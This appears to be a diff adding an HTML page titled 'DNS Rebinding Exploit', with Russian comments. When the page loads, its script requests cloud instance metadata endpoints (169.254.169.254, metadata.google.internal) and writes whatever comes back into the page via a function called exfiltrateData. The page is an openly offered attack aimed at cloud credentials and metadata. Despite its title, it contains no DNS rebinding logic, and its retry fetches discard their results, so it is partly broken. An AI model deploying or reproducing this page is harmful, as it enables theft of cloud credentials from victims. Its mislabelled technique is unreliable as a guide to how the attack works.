@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DNS Rebinding Exploit</title>
+    <script>
+        let attempt = 0;
+        
+        function exfiltrateData(data) {
+            console.log("Данные получены:", data);
+            // Выводим данные на страницу
+            document.getElementById('output').innerHTML = 
+                `<pre>${data}</pre>`;
+        }
+
+        function fetchMetadata() {
+            attempt++;
+            console.log(`Попытка ${attempt}`);
+            
+            // Пробуем HTTPS вместо HTTP
+            fetch('https://169.254.169.254/latest/meta-data/')
+                .then(response => response.text())
+                .then(data => exfiltrateData(data))
+                .catch(error => {
+                    console.log(`Попытка ${attempt} failed:`, error);
+                    
+                    // Пробуем разные эндпоинты
+                    const endpoints = [
+                        'http://metadata.google.internal/computeMetadata/v1/',
+                        'http://169.254.169.254/metadata/',
+                        'http://metadata.google.internal/',
+                        'http://169.254.169.254/latest/',
+                        'http://metadata/'
+                    ];
+                    
+                    if (attempt < endpoints.length) {
+                        setTimeout(() => fetch(endpoints[attempt]), 1000);
+                    }
+                });
+        }
+
+        window.onload = fetchMetadata;
+    </script>
+</head>
+<body>
+    <h1>DNS Rebinding Exploit</h1>
+    <div id="output">Загрузка...</div>
+</body>
+</html>
